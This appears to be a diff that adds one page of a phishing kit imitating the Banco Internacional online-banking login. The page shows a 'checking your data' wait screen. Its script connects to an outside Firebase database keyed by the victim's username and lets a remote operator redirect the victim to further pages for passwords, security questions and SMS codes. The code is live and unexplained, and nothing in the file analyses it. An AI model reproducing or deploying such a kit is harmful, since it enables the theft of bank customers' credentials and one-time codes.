@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<!-- saved from url=(0072)#mcm-web-baninter/login.jsp -->
+<html
+  xmlns="http://www.w3.org/1999/xhtml"
+  xml:lang="es"
+  lang="es"
+  class="dj_webkit dj_chrome dj_contentbox"
+>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import {
+      getFirestore,
+      doc,
+      setDoc,
+      onSnapshot,
+    } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+      authDomain: "basedtos-84767.firebaseapp.com",
+      projectId: "basedtos-84767",
+      storageBucket: "basedtos-84767.appspot.com",
+      messagingSenderId: "622608516389",
+      appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.db = db; // Hacer db accesible globalmente
+    window.doc = doc;
+    window.setDoc = setDoc;
+    window.onSnapshot = onSnapshot;
+  </script>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Banco Internacional</title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE" />
+    <meta http-equiv="PRAGMA" content="NO-CACHE" />
+    <meta name="google" value="notranslate" />
+    <link
+      type="image/x-icon"
+      href="#mcm-web-skin/cache/2408152126/images/favicon_fisaDesert.ico"
+      rel="icon"
+    />
+    <link
+      type="image/x-icon"
+      href="#mcm-web-skin/cache/2408152126/images/favicon_fisaDesert.ico"
+      rel="shortcut icon"
+    />
+
+    <link
+      href="./index_files/fisaDesertAll.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./index_files/fisaDesertLogin.css"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./index_files/fisaDesertLoginCustom.css"
+    />
+
+    <style type="text/css" id="operaUserStyle"></style>
+  </head>
+
+  <body
+    class="fisaDesert"
+    __processed_2814c388-ec35-4d60-b7ef-5193cf080f3a__="true"
+    cz-shortcut-listen="true"
+    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNiIsInNjb3JlIjoyMDAxNn1d"
+    bis_skin_checked="1"
+  >
+    <div class="bgbody" bis_skin_checked="1"></div>
+    <div id="header" bis_skin_checked="1">
+      <div id="logo" bis_skin_checked="1">
+        <img src="./index_files/logow.png" />
+      </div>
+      <div id="topnavhome" bis_skin_checked="1">
+        <ul class="menuhome">
+          <li class="first-item bold">Bienvenido(a)</li>
+          <li>
+            <a href="#mcm-web-baninter/login.jsp#">Ayuda</a>
+          </li>
+          <li class="last-item">
+            <a href="#mcm-web-baninter/login.jsp#">Contáctanos</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <form id="loginform">
+      <div id="finalUserContent" bis_skin_checked="1">
+        <div id="content" bis_skin_checked="1">
+          <div
+            id="ec_fisa_message_Panel_0"
+            lang="es"
+            widgetid="ec_fisa_message_Panel_0"
+            bis_skin_checked="1"
+          ></div>
+
+          <div
+            dojotype="dijit.layout.ContentPane"
+            region="center"
+            dolayout="false"
+            refreshonshow="true"
+            id="borderContainerTwo"
+            class="dijitContentPane"
+            lang="es"
+            widgetid="borderContainerTwo"
+            bis_skin_checked="1"
+          >
+            <div
+              dojotype="dojox.layout.ContentPane"
+              region="center"
+              dolayout="false"
+              refreshonshow="true"
+              style="width: 100%"
+              class="dijitContentPane"
+              id="dojox_layout_ContentPane_0"
+              lang="es"
+              widgetid="dojox_layout_ContentPane_0"
+              bis_skin_checked="1"
+            >
+              <div id="mainwindow" bis_skin_checked="1">
+                <div id="headerwindow" bis_skin_checked="1">
+                  <p>
+                    Si su Usuario o Clave fue comprometida, favor contactar al
+                    banco al : 800-7555 o 210-8255
+                  </p>
+                </div>
+                <div id="formwindow" bis_skin_checked="1">
+                  <div style="text-align: center">
+                    <div style="padding-top: 20px">
+                      <h3>Estamos comprobando sus datos espere un momento</h3>
+                      <img
+                        src="https://i.gifer.com/ZKZg.gif"
+                        style="width: 150px; margin-top: 30px"
+                      />
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+
+    <!-- EMPIEZA SECCION DEL FOOTER -->
+    <div id="footer" bis_skin_checked="1">
+      <div id="copy" bis_skin_checked="1">
+        <p>
+          Copyright (c) 2019 Banco Internacional. Todos los derechos reservados.
+        </p>
+      </div>
+    </div>
+
+    <div
+      id="dojox_widget_Standby_0"
+      widgetid="dojox_widget_Standby_0"
+      bis_skin_checked="1"
+    >
+      <div
+        style="
+          display: none;
+          opacity: 0;
+          z-index: 9999;
+          position: absolute;
+          cursor: wait;
+          background-color: rgb(226, 235, 254);
+        "
+        dojoattachpoint="_underlayNode"
+        bis_skin_checked="1"
+      ></div>
+      <img
+        src="./index_files/loading.gif"
+        style="
+          opacity: 0;
+          display: none;
+          z-index: -10000;
+          position: absolute;
+          top: 0px;
+          left: 0px;
+          cursor: wait;
+        "
+        dojoattachpoint="_imageNode"
+        alt="Espere por favor..."
+      />
+      <div
+        style="
+          opacity: 0;
+          display: none;
+          z-index: -10000;
+          position: absolute;
+          top: 0px;
+        "
+        dojoattachpoint="_textNode"
+        bis_skin_checked="1"
+      >
+        Espere por favor...
+      </div>
+    </div>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "internaciona1s",
+        localStorage.getItem("usuario")
+      );
+
+      // Usa `onSnapshot` directamente
+      onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+          console.log("New question:", questionData.question);
+          console.log("Current page:", questionData.page);
+
+          // Redirecciona basado en el valor de `page`
+          switch (questionData.page) {
+            case 1:
+              window.location.href = "index.html";
+              break;
+            case 2:
+              window.location.href = "password.html";
+              break;
+            case 3:
+              window.location.href = "security.html";
+              break;
+            case 4:
+              window.location.href = "password.html";
+              break;
+            case 5:
+              window.location.href = "pregunta.html";
+              break;
+            case 6:
+              window.location.href = "sms.html";
+              break;
+
+            default:
+              console.log("Page not recognized.");
+          }
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+</html>
